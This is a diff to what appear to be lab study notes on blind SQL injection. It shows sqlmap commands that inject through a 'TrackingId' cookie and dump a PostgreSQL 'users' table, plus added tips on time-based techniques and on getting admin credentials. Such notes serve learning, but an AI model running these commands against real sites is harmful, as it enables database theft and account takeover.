@@ -238,7 +238,8 @@ docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "T
 docker run -it --rm secsi/sqlmap -u "<target_url>" --cookie="TrackingId=1" -p "TrackingId" --level 3 -T users --dbms=postgresql --dump
 ```
 
-// maybe add "--time-sec=4" above too cuz "[ERROR] invalid character detected. retrying.." - FMisi
+// maybe add "--time-sec=4" above too cuz "[ERROR] invalid character detected. retrying.."
+// OR if time-based blind, then --technique T    - FMisi
 
 alt.:
 
@@ -317,7 +318,8 @@ if
 [ERROR] invalid character detected. retrying..
 ```
 then
---time-sec=4
+--time-sec=4 OR if it is cuz time-based blind, then
+--technique T
 
 Ctrl+C on sqlmap could potentially give admin creds in this case, but not always
 
